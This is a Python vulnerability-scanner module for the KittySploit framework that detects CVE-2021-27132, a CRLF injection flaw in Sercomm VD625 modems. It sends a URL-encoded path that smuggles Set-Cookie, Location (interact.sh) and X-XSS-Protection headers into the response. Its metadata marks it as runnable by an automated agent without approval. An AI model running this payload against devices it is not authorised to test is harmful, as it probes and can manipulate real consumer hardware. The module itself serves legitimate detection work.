#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sercomm AGCOMBO VD625 Smart Modems with firmware version AGSOT_2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sercomm VD625 Smart Modems - CRLF Injection Detection',
        'description': 'Sercomm AGCOMBO VD625 Smart Modems with firmware version AGSOT_2.1.0 are vulnerable to Carriage Return Line Feed (CRLF) injection via the Content-Disposition header.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'crlf', 'injection', 'sercomm', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cybertuz.com/blog/post/crlf-injection-CVE-2021-27132',
            'http://sercomm.com',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-27132',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-27132',
    }

    def run(self):
        r = self.http_request(method="GET", path='/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20interact.sh%0d%0aX-XSS-Protection:0', allow_redirects=False)
        if not r or r.status_code != 404:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('Content-Disposition: attachment;filename=test.txt', 'Set-Cookie:CRLFInjection=Test', 'Location: interact.sh', 'X-XSS-Protection:0',)
        if (all(m in headers for m in header_all)):
            self.set_info(
                severity='critical',
                reason="Sercomm VD625 Smart Modems - CRLF Injection detected",
                path='/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20interact.sh%0d%0aX-XSS-Protection:0',
            )
            return True
        return False

